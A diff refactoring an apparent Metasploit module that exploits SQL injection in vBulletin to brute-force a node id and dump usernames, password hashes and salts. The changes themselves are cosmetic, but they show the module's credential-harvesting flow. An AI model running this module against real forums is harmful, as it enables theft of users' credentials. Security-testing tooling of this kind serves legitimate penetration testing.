@@ -5,7 +5,7 @@
 
 require 'msf/core'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
@@ -62,7 +62,7 @@ class Metasploit3 < Msf::Auxiliary
     max = datastore["MAXNODE"]
 
     if min > max
-      print_error("#{peer} - MINNODE can't be major than MAXNODE")
+      print_error("MINNODE can't be major than MAXNODE")
       return nil
     end
 
@@ -77,11 +77,11 @@ class Metasploit3 < Msf::Auxiliary
 
   def get_node
     if datastore['NODE'].nil? or datastore['NODE'] <= 0
-      print_status("#{peer} - Brute forcing to find a valid node id...")
+      print_status("Brute forcing to find a valid node id...")
       return brute_force_node
     end
 
-    print_status("#{peer} - Checking node id #{datastore['NODE']}...")
+    print_status("Checking node id #{datastore['NODE']}...")
     if exists_node?(datastore['NODE'])
       return datastore['NODE']
     else
@@ -173,23 +173,23 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run
-    print_status("#{peer} - Checking for a valid node id...")
+    print_status("Checking for a valid node id...")
     node_id = get_node
     if node_id.nil?
-      print_error("#{peer} - node id not found")
+      print_error("node id not found")
       return
     end
 
-    print_good("#{peer} - Using node id #{node_id} to exploit sqli... Counting users...")
+    print_good("Using node id #{node_id} to exploit sqli... Counting users...")
     data = do_sqli(node_id, "select count(*) from user")
     if data.blank?
-      print_error("#{peer} - Error exploiting sqli")
+      print_error("Error exploiting sqli")
       return
     end
     count_users = data.to_i
-    print_good("#{peer} - #{count_users} users found. Collecting credentials...")
+    print_good("#{count_users} users found. Collecting credentials...")
 
-    users_table = Rex::Ui::Text::Table.new(
+    users_table = Rex::Text::Table.new(
       'Header'  => 'vBulletin Users',
       'Indent'   => 1,
       'Columns' => ['Username', 'Password Hash', 'Salt']
